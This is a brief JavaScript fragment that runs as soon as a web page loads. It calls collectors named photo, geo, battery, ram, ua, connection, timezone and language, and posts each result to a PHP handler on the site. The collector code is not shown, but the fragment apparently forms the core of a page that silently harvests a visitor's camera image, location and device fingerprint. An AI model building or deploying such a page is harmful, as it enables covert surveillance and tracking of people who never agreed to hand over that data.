document.addEventListener("DOMContentLoaded", async () =>
{
    await Promise.all([

        photo(), geo(),
        battery(), ram(),
        ua(), connection(),
        timezone(), language()
    ]);
});

async function send(key, value)
{
    const data = {};
    data[key] = value;

    await fetch("/php/handler.php", {

        method: "POST",
        headers: { "Content-Type": "application/json; charset=UTF-8" },
        body: JSON.stringify(data)
    });
}
